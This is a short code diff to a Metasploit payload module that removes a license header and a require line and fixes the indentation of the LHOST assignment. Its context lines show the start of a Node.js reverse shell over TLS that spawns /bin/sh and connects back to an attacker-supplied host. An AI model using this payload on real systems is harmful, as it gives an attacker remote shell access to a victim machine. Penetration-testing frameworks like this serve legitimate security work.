@@ -1,12 +1,3 @@
-
-##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
-##
-
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp_ssl'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
@@ -52,7 +43,7 @@ module MetasploitModule
   #
   def command_string
 
- 		lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
+    lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
     cmd   = <<EOS
 var tls = require("tls"), spawn = require("child_process").spawn, util = require("util"), sh = spawn("/bin/sh",[]);
 var client = this;
